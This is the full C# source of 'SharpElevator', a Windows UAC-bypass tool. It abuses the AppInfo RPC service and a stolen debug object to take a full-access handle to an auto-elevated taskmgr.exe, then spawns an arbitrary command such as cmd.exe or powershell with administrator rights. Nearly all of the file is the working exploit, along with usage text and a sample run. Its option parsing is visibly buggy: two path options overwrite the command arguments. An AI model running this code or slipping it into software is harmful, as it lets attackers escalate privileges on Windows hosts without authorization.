using NtApiDotNet;
using NtApiDotNet.Ndr.Marshal;
using NtApiDotNet.Win32;
using rpc_201ef99a_7fa0_444c_9399_19ba84f12a1a_1_0;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace LaunchUACAdmin
{
    class Program
    {
        [DllImport("User32.dll")]
        static extern IntPtr GetDesktopWindow();

        [Flags]
        enum StartFlags
        {
            None = 0,
            RunAsAdmin = 0x1,
            Unknown02 = 0x2,
            Unknown04 = 0x4,
            Wow64Path = 0x8,
            Unknown10 = 0x10,
            Unknown20 = 0x20,
            Unknown40 = 0x40,
            Untrusted = 0x80,
            CentennialElevation = 0x200,
        }

        static NtProcess LaunchAdminProcess(string executable, string cmdline, StartFlags flags, CreateProcessFlags create_flags, string desktop)
        {
            StartAppinfoService();

            using (Client client = new Client())
            {
                client.Connect();
                create_flags |= CreateProcessFlags.UnicodeEnvironment;
                Struct_0 start_info = new Struct_0();
                int retval = client.AiEnableDesktopRpcInterface(executable, cmdline, (int)flags, (int)create_flags,
                    @"c:\windows", desktop, start_info, new NdrUInt3264(GetDesktopWindow()),
                    -1, out Struct_2 proc_info, out int elev_type);
                if (retval != 0)
                {
                    throw new Win32Exception(retval);
                }

                using (var thread = NtThread.FromHandle(new IntPtr(proc_info.Member8.Value)))
                {
                    return NtProcess.FromHandle(new IntPtr(proc_info.Member0.Value));
                }
            }
        }

        static void StartAppinfoService()
        {
            try
            {
                ServiceController service = new ServiceController("appinfo");
                if (service.Status != ServiceControllerStatus.Running)
                {
                    service.Start();
                    service.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(5));
                }
            }
            catch
            {
            }
        }

        private static void PrintHelp()
        {
            string usage = @"
SharpElevator is a C# implementation of Elevator by Kurosh Dabbagh Escalante for UAC bypass.

This UAC bypass was originally discovered by James Forshaw (@tiraniddo) and published in his brilliant post at:
https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html

  Usage: SharpElevator.exe [/command:<command to execute>] [/arguments:<command line arguments>] 
                           [/unelevatedpath:<path>] [/elevatedpath:<path>] [/nowindow] [/newconsole]

  Arguments:
    [/command:<command to execute>]        Sets the command to executed in an elevated contex. 
                                           Defaults to cmd.exe.

    [/arguments:<command line arguments>]  Sets the command line arguments.
                                           Defaults to blank.

    [/unelevatedpath:<path>]               Sets the path of a sacrificial program to launch in an unelevated context.
                                           Defaults to C:\Windows\System32\notepad.exe

    [/unelevatedpath:<path>]               Sets the path of a sacrificial auto-elevated program.
                                           Defaults to C:\Windows\System32\taskmgr.exe

    [/nowindow]                            Sets the NoWindow flag for the new process.
                                           Defaults to false.

    [/newconsole]                          Sets the NewConsole flag for the new process.
                                           Defaults to false.

  Example:
    ..>SharpElevator.exe /command:cmd.exe /arguments:""/ c powershell.exe"" /newconsole

        [+] Unelevatad process created(C:\Windows\System32\notepad.exe)
        [+] Reference to debug object obtained
        [+] Terminated unelevated process
        [+] Detached debug object from unelevetad process
        [+] Elevatad process created(C:\Windows\System32\taskmgr.exe)
        [+] Initial process creation debug event retrieved
        [+] Obtained full access handle to elevated process
        [+] Terminated elevated process
        [+] Detached debug object from elevetad process
        [+] WOOT! Created elevated process cmd.exe /c powershell.exe

";
            Console.WriteLine(usage);
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                PrintHelp();
                return;
            }

            try
            {
                var arguments = new Dictionary<string, string>();
                for (int i = 0; i < args.Length; i++)
                {
                    string argument = args[i];
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                    {
                        arguments[argument.Substring(1, idx - 1).ToLower()] = argument.Substring(idx + 1);
                    }
                    else
                    {
                        idx = argument.IndexOf('=');
                        if (idx > 0)
                        {
                            arguments[argument.Substring(1, idx - 1).ToLower()] = argument.Substring(idx + 1);
                        }
                        else
                        {
                            arguments[argument.Substring(1).ToLower()] = string.Empty;
                        }
                    }
                }

                string unelevatedPath = @"C:\Windows\System32\notepad.exe";
                string elevatedPath = @"C:\Windows\System32\taskmgr.exe";
                string command = "cmd.exe";
                string commandArguments = "";
                bool newConsole = false;
                bool noWindow = false;

                if (arguments.ContainsKey("command") && !String.IsNullOrEmpty(arguments["command"]))
                {
                    command = arguments["command"];
                }
                if (arguments.ContainsKey("arguments") && !String.IsNullOrEmpty(arguments["arguments"]))
                {
                    commandArguments = arguments["arguments"];
                }
                if (arguments.ContainsKey("unelevatedpath") && !String.IsNullOrEmpty(arguments["unelevatedpath"]))
                {
                    commandArguments = arguments["unelevatedpath"];
                }
                if (arguments.ContainsKey("elevatedpath") && !String.IsNullOrEmpty(arguments["elevatedpath"]))
                {
                    commandArguments = arguments["elevatedpath"];
                }
                if (arguments.ContainsKey("newconsole"))
                {
                    newConsole = true;
                }
                if (arguments.ContainsKey("nowindow"))
                {
                    noWindow = true;
                }

                var unelevatedProcess = LaunchAdminProcess(unelevatedPath, null, StartFlags.None, CreateProcessFlags.UnicodeEnvironment | CreateProcessFlags.DebugProcess, @"WinSta0\Default");
                Console.WriteLine("[+] Unelevatad process created ({0})", unelevatedPath);

                NtDebug debugObject = unelevatedProcess.OpenDebugObject();
                if (debugObject == null)
                {
                    throw new Exception("Could not obtain debug object");
                }
                Console.WriteLine("[+] Reference to debug object obtained");

                unelevatedProcess.Terminate(0);
                Console.WriteLine("[+] Terminated unelevated process");

                NtStatus ntStatus = debugObject.Detach(unelevatedProcess, true);
                if (ntStatus != NtStatus.STATUS_SUCCESS)
                {
                    throw new Exception("Could not detach debug object from unelevetad process");
                }
                Console.WriteLine("[+] Detached debug object from unelevetad process");

                var elevatedProcess = LaunchAdminProcess(elevatedPath, null, StartFlags.RunAsAdmin, CreateProcessFlags.UnicodeEnvironment | CreateProcessFlags.DebugProcess, @"WinSta0\Default");
                Console.WriteLine("[+] Elevatad process created ({0})", elevatedPath);

                DebugEvent debugEvent = debugObject.WaitForDebugEvent(0);
                if (debugEvent == null)
                {
                    throw new Exception("Could not retrieve initial process creation event");
                }
                Console.WriteLine("[+] Initial process creation debug event retrieved");

                IntPtr sourceHandle = (IntPtr)(-1);
                NtProcess newProcess = NtProcess.DuplicateFrom(((CreateProcessDebugEvent)debugEvent).Process, sourceHandle);
                Console.WriteLine("[+] Obtained full access handle to elevated process");

                ((CreateProcessDebugEvent)debugEvent).Process.Terminate(0);
                Console.WriteLine("[+] Terminated elevated process");

                ntStatus = debugObject.Detach(newProcess, true);
                if (ntStatus != NtStatus.STATUS_SUCCESS)
                {
                    throw new Exception("Could not detach debug object from elevetad process");
                }
                Console.WriteLine("[+] Detached debug object from elevetad process");

                Win32ProcessConfig config = new Win32ProcessConfig();

                config.CreationFlags = CreateProcessFlags.None;
                if (noWindow)
                {
                    config.CreationFlags |= CreateProcessFlags.NoWindow;
                }
                if (newConsole)
                {
                    config.CreationFlags |= CreateProcessFlags.NewConsole;
                }
                config.ParentProcess = newProcess;
                config.CommandLine = String.Format("{0} {1}", command, commandArguments);
                if (Win32Process.CreateProcess(config) != null)
                {
                    Console.WriteLine("[+] WOOT! Created elevated process {0}", config.CommandLine);
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[X] {0}", ex.Message);
            }
        }
    }
}
